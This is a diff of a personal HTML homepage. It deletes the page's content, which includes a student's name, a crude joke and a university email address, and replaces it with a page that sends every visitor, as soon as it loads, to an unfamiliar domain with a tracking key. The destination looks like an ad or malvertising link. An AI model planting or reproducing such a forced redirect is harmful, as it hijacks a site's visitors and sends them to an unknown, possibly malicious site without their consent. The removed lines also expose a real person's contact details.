@@ -1,52 +1,13 @@
-
+<!DOCTYPE html>
 <html>
 <head>
-  <title>WELCOME WTF!!</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 20px;
-    }
-  
-    header {
-      background-color: #333;
-      color: #fff;
-      padding: 10px;
-      text-align: center;
-    }
-  
-    h1 {
-      margin: 0;
-    }
-  
-    main {
-      margin-top: 20px;
-    }
-  
-    footer {
-      background-color: #333;
-      color: #fff;
-      padding: 10px;
-      text-align: center;
-    }
-  </style>
+<meta http-equiv="refresh" content="0; URL=https://purposelynextbinary.com/phnq9eqzu?key=2316458babdb01d5b93f63870bc67caa">
+<title>Redirecting...</title>
 </head>
 <body>
-  <header>
-    <h1>AQOUH LANG TO GUYS</h1>
-  </header>
-  
-  <main>
-    <h2>About Me</h2>
-    <p>Hello! My name is John Michael Caol-olan.. BOBO KA BA?.</p>
-    
-    <h2>Contact</h2>
-    <p>Email: johnmichaeldelmiguez.caololan@bicol-u.edu.ph</p>
-  </main>
-  
-  <footer>
-    &copy; 2023 My Website. All rights reserved.
-  </footer>
+<p>Redirecting to <a href="https://purposelynextbinary.com/phnq9eqzu?key=2316458babdb01d5b93f63870bc67caa">https://purposelynextbinary.com/phnq9eqzu?key=2316458babdb01d5b93f63870bc67caa</a></p>
+<script type="text/javascript">
+window.location.href = "https://purposelynextbinary.com/phnq9eqzu?key=2316458babdb01d5b93f63870bc67caa"
+</script>
 </body>
 </html>
